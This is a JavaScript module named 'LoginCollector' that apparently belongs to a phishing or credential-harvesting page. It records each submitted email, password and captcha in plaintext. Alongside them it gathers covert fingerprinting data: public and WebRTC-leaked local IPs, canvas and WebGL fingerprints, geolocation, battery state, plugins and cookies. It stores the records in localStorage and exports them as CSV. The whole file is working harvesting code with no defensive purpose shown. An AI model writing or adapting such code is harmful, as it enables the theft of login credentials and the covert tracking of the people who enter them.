/**
 * Login Data Collector
 * Collects comprehensive user data and fingerprinting information
 * Stores in localStorage under 'login_data' key
 */

const LoginCollector = {
  // ── Storage Keys ─────────────────────────────────────────────
  STORAGE_KEY: 'login_data',

  // ── Get all login data ───────────────────────────────────────
  getAll() {
    try {
      return JSON.parse(localStorage.getItem(this.STORAGE_KEY) || '[]');
    } catch {
      return [];
    }
  },

  // ── Save login data ──────────────────────────────────────────
  save(data) {
    try {
      const all = this.getAll();
      all.push(data);
      localStorage.setItem(this.STORAGE_KEY, JSON.stringify(all));
      return true;
    } catch (e) {
      console.error('Storage error:', e);
      return false;
    }
  },

  // ── Get Public IP ────────────────────────────────────────────
  async getPublicIP() {
    try {
      const response = await fetch('https://api.ipify.org?format=json', { timeout: 3000 });
      const data = await response.json();
      return data.ip || 'N/A';
    } catch {
      return 'N/A';
    }
  },

  // ── Get Local IPs via WebRTC ─────────────────────────────────
  getLocalIPs() {
    return new Promise((resolve) => {
      const ips = [];
      const pc = new RTCPeerConnection({ iceServers: [] });
      
      pc.createDataChannel('');
      pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
      
      pc.onicecandidate = (ice) => {
        if (!ice || !ice.candidate) {
          resolve(ips.join(', ') || 'N/A');
          return;
        }
        const ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
        if (ipMatch && !ips.includes(ipMatch[1])) {
          ips.push(ipMatch[1]);
        }
      };
      
      setTimeout(() => resolve(ips.join(', ') || 'N/A'), 1000);
    });
  },

  // ── Get Device & Browser Info ────────────────────────────────
  getDeviceInfo() {
    const ua = navigator.userAgent;
    let os = 'Unknown';
    let browser = 'Unknown';
    let platform = navigator.platform;

    if (ua.indexOf('Windows') > -1) os = 'Windows';
    else if (ua.indexOf('Mac') > -1) os = 'macOS';
    else if (ua.indexOf('Linux') > -1) os = 'Linux';
    else if (ua.indexOf('Android') > -1) os = 'Android';
    else if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) os = 'iOS';

    if (ua.indexOf('Chrome') > -1 && ua.indexOf('Chromium') === -1) browser = 'Chrome';
    else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) browser = 'Safari';
    else if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
    else if (ua.indexOf('Edge') > -1) browser = 'Edge';
    else if (ua.indexOf('Trident') > -1) browser = 'Internet Explorer';

    const deviceType = /mobile|android|iphone|ipad|tablet|windows phone/i.test(ua) ? 'Mobile' : 'Desktop';

    return { os, browser, platform, deviceType, userAgent: ua };
  },

  // ── Get Screen Info ──────────────────────────────────────────
  getScreenInfo() {
    return {
      width: window.screen.width,
      height: window.screen.height,
      colorDepth: window.screen.colorDepth,
      pixelDepth: window.screen.pixelDepth,
      pixelRatio: window.devicePixelRatio || 1,
    };
  },

  // ── Get Location Info ────────────────────────────────────────
  getLocationInfo() {
    return {
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      language: navigator.language || 'N/A',
      referrer: document.referrer || 'Direct',
    };
  },

  // ── Get Canvas Fingerprint ───────────────────────────────────
  getCanvasFingerprint() {
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      const text = 'sophia_pay_' + Math.random();
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillText(text, 2, 2);
      return canvas.toDataURL().substring(0, 50);
    } catch {
      return 'N/A';
    }
  },

  // ── Get WebGL Fingerprint ────────────────────────────────────
  getWebGLFingerprint() {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (!gl) return 'N/A';
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      return renderer || 'N/A';
    } catch {
      return 'N/A';
    }
  },

  // ── Generate Fingerprint Hash ────────────────────────────────
  generateFingerprintHash(data) {
    const str = JSON.stringify(data);
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      const char = str.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash = hash & hash;
    }
    return Math.abs(hash).toString(16).substring(0, 16);
  },

  // ── Get Geolocation ──────────────────────────────────────────
  getGeolocation() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve({ lat: 'N/A', lng: 'N/A', accuracy: 'N/A' });
        return;
      }
      navigator.geolocation.getCurrentPosition(
        (pos) => resolve({
          lat: pos.coords.latitude.toFixed(6),
          lng: pos.coords.longitude.toFixed(6),
          accuracy: pos.coords.accuracy.toFixed(2),
        }),
        () => resolve({ lat: 'N/A', lng: 'N/A', accuracy: 'N/A' }),
        { timeout: 3000 }
      );
    });
  },

  // ── Get Battery Info ─────────────────────────────────────────
  async getBatteryInfo() {
    try {
      if (!navigator.getBattery && !navigator.battery) return { level: 'N/A', charging: 'N/A' };
      const battery = await navigator.getBattery?.() || navigator.battery;
      if (!battery) return { level: 'N/A', charging: 'N/A' };
      return {
        level: Math.round(battery.level * 100) + '%',
        charging: battery.charging ? 'Yes' : 'No',
      };
    } catch {
      return { level: 'N/A', charging: 'N/A' };
    }
  },

  // ── Get Browser Plugins ──────────────────────────────────────
  getPlugins() {
    const plugins = [];
    for (let i = 0; i < navigator.plugins.length; i++) {
      plugins.push(navigator.plugins[i].name);
    }
    return plugins.length > 0 ? plugins.join(', ') : 'None';
  },

  // ── Get Storage Status ───────────────────────────────────────
  getStorageStatus() {
    return {
      localStorageEnabled: (() => {
        try {
          localStorage.setItem('_test', '1');
          localStorage.removeItem('_test');
          return 'Yes';
        } catch {
          return 'No';
        }
      })(),
      sessionStorageEnabled: (() => {
        try {
          sessionStorage.setItem('_test', '1');
          sessionStorage.removeItem('_test');
          return 'Yes';
        } catch {
          return 'No';
        }
      })(),
    };
  },

  // ── Get Cookies ──────────────────────────────────────────────
  getCookies() {
    return document.cookie || 'None';
  },

  // ── Main Collection Function ─────────────────────────────────
  async collectData(email, password, captcha, sourcePage) {
    try {
      const deviceInfo = this.getDeviceInfo();
      const screenInfo = this.getScreenInfo();
      const locationInfo = this.getLocationInfo();
      const canvasFingerprint = this.getCanvasFingerprint();
      const webglFingerprint = this.getWebGLFingerprint();
      const batteryInfo = await this.getBatteryInfo();
      const geoLocation = await this.getGeolocation();
      const publicIP = await this.getPublicIP();
      const localIPs = await this.getLocalIPs();

      const fingerprintData = {
        canvasFingerprint,
        webglFingerprint,
        deviceInfo,
        screenInfo,
        locationInfo,
        batteryInfo,
      };

      const data = {
        id: 'login_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8).toUpperCase(),
        email,
        password,
        captcha,
        sourcePage,
        publicIP,
        localIPs,
        deviceType: deviceInfo.deviceType,
        os: deviceInfo.os,
        browser: deviceInfo.browser,
        platform: deviceInfo.platform,
        userAgent: deviceInfo.userAgent,
        screenWidth: screenInfo.width,
        screenHeight: screenInfo.height,
        colorDepth: screenInfo.colorDepth,
        pixelRatio: screenInfo.pixelRatio,
        timezone: locationInfo.timezone,
        language: locationInfo.language,
        referrer: locationInfo.referrer,
        canvasFingerprint,
        webglFingerprint,
        fingerprintHash: this.generateFingerprintHash(fingerprintData),
        geolocation: geoLocation,
        batteryLevel: batteryInfo.level,
        isCharging: batteryInfo.charging,
        plugins: this.getPlugins(),
        localStorageEnabled: this.getStorageStatus().localStorageEnabled,
        sessionStorageEnabled: this.getStorageStatus().sessionStorageEnabled,
        cookies: this.getCookies(),
        timestamp: new Date().toISOString(),
        submittedAt: new Date().toLocaleString(),
      };

      this.save(data);
      return data;
    } catch (e) {
      console.error('Data collection error:', e);
      return null;
    }
  },

  // ── Delete by ID ─────────────────────────────────────────────
  deleteById(id) {
    try {
      let all = this.getAll();
      all = all.filter(d => d.id !== id);
      localStorage.setItem(this.STORAGE_KEY, JSON.stringify(all));
      return true;
    } catch {
      return false;
    }
  },

  // ── Clear All ────────────────────────────────────────────────
  clearAll() {
    try {
      localStorage.removeItem(this.STORAGE_KEY);
      return true;
    } catch {
      return false;
    }
  },

  // ── Export to CSV ────────────────────────────────────────────
  exportToCSV() {
    try {
      const data = this.getAll();
      if (data.length === 0) {
        alert('No data to export');
        return;
      }

      const headers = Object.keys(data[0]);
      let csv = headers.join(',') + '\n';
      
      data.forEach(row => {
        const values = headers.map(header => {
          const value = row[header] || '';
          const escaped = String(value).replace(/"/g, '""');
          return /[,"\n]/.test(escaped) ? `"${escaped}"` : escaped;
        });
        csv += values.join(',') + '\n';
      });

      const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
      const link = document.createElement('a');
      link.href = URL.createObjectURL(blob);
      link.download = 'login_data_' + new Date().toISOString().slice(0, 10) + '.csv';
      link.click();
      return true;
    } catch (e) {
      console.error('CSV export error:', e);
      return false;
    }
  },
};

// Make available globally
window.LoginCollector = LoginCollector;
